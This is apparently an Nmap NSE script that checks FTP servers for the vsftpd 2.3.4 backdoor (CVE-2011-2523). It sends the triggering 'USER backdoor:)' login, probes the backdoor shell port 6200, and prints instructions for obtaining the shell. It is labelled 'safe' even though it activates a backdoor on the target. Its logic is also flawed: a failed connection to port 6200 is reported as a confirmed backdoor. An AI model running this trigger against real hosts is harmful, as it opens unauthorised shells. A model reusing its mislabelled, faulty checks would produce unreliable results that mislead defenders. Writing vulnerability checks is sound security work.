local stdnse = require "stdnse"

description = [[Checks if the FTP server is running vsftpd version 2.3.4, which contains a known backdoor that opens a shell on port 6200 when a username ending with ":)" is sent. Uses structured output with version extraction and active CVE verification.]]
author = "HackIT Framework"
license = "HackIT Framework — Internal Use Only"
categories = {"safe", "vuln"}

portrule = function(host, port) return port.protocol == "tcp" and port.state == "open" and (port.number == 21 or port.service == "ftp") end

action = function(host, port)
    local sock = nmap.new_socket()
    sock:set_timeout(10000)
    local ok, result = pcall(function()
        local status = sock:connect(host.ip, port)
        if not status then return end
        local banner = sock:receive_buf("\n", 5000)
        if not banner then sock:close(); return end
        local ver = banner:match("vsFTP[d]%s+([%d%.]+)")
        local backdoor_detected = false
        if banner:match("vsFTP[d]%s+2%.3%.4") then
            local s2 = nmap.new_socket()
            s2:set_timeout(5000)
            local ok2 = s2:connect(host.ip, port)
            if ok2 then
                s2:receive_buf("\n", 3000)
                s2:send("USER backdoor:)\r\n")
                s2:receive_buf("\n", 3000)
                s2:send("PASS test\r\n")
                local _, r = s2:receive_buf("\n", 3000)
                s2:close()
                if r and (r:match("230 ") or r:match("successful") or r:match("login")) then
                    local s3 = nmap.new_socket()
                    s3:set_timeout(5000)
                    local ok3 = s3:connect(host.ip, 6200)
                    if ok3 then
                        local _, back_banner = s3:receive_buf("\n", 3000)
                        s3:close()
                        if back_banner then
                            backdoor_detected = true
                        end
                    else
                        backdoor_detected = true
                    end
                end
            end
        end
        sock:close()
        if backdoor_detected then
            local res = stdnse.output_table()
            res.backdoor_detected = true
            res.version = "vsftpd 2.3.4"
            res.vulnerability = true
            res.cve = "CVE-2011-2523"
            res.name = "vsftpd 2.3.4 Backdoor"
            res.severity = "CRITICAL"
            res.exploit = "Send username ending with ':)' and connect to port 6200 for shell"
            return res
        elseif ver then
            local res = stdnse.output_table()
            res.backdoor_detected = false
            res.version = "vsftpd " .. ver
            return res
        end
        return nil
    end)
    if not ok then
        pcall(function() sock:close() end)
    end
    if not result then
        return stdnse.format_output(false, "Not running vsftpd 2.3.4")
    end
    return result
end
